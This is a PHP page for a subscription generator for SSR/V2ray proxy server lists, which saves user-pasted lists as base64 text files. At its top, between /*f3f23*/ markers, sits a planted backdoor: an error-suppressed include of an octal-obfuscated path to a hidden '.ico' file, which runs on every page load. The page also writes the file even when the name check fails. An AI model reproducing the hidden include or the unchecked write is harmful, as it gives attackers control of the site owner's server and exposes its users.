<?php 
/*f3f23*/

@include "\\057www/\\167wwro\\157t/ss\\162.las\\157y.ne\\164/ssr\\057.1f9\\145a354\\056ico";

/*f3f23*/
?> 
<html>
<head>
    <meta charset="utf-8">
    <title>SSR/V2ray 订阅站点生成器</title>
    <style>
        .error {color: #FF0000;}
    .style1 {
font-family: Arial, Helvetica, sans-serif;
color: #FF0000;
}
    .style2 {font-family: Arial, Helvetica, sans-serif}
    </style>
</head>
<body>

<?php
// 定义变量并默认设置为空值
$nameErr=$websiteErr = "";
if ($_SERVER["REQUEST_METHOD"] == "POST")
{
    if (empty($_POST["name"]))
    {
        $nameErr = "请输入您希望的订阅文件名";
    }
    else
    {
        $name = test_input($_POST["name"]);
        // 检测名字是否只包含字母跟空格
        if (!preg_match("/^[a-zA-Z0-9]*$/",$name))
        {
            $nameErr = "只允许字母和数字";
               }
    }

        if (empty($_POST["comment"]))
    {
        $comment = "";
    }
    else
    {
        $comment = test_input($_POST["comment"]);

        $myfile = fopen("./ssr/".$name.".txt", "w") ;
        fwrite($myfile, base64_encode($comment));
        fclose($myfile);
        $okl=1;
    }


}

function test_input($data)
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}


?>

<h2><span class="style2">SS/SSR/ V2ray 订阅站点生成器</span> </h2>
<table width="100" border="0">
  <tr>
    <td width="55%"><p><form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
        填写站点文件名:<br> <input name="name" type="text" autofocus="autofocus" multiple="multiple" required="required" title="您希望的站点文件名" autocomplete="on" value="<?php echo $name;?>"> <br>
    例如：<span class="style2">zhang123</span> （您个人容易记忆即可） <br>    
  生成的订阅地址样式：<span class="style1">https://ssr.lasoy.cn/ssr/zhang123.txt</span>  <br>
  <span class="error">每次生成，原文件被覆盖，达到自动更新的效果。您只需保持文件名不变即可。<br>
 </span>
    <br>
    <span class="style2">SSR/SS/V2ray</span>服务器列表: <br>
  <textarea name="comment" cols="100" rows="12" required="required" title="粘贴您的SSR服务器列表"><?php echo $comment;?></textarea>
    <br>
    <br>
    <input name="submit" type="submit" title="点击创建站点链接" value="创建"  onClick="disabled" >
</p></form>   </td>
  </tr>

  <tr>
    <td height="52" bgcolor="#efefef"> <div align="center">
      <?php
if ($okl<>"") {
    echo "<br>创建成功! 把后面的链接分享给您的朋友即可。→ <a href=./ssr/".$name.".txt target=_blank> https://ssr.lasoy.cn/ssr/".$name.".txt</a>";

}

?>
    </div></td>
  </tr>
  </table>
</body>
</html>
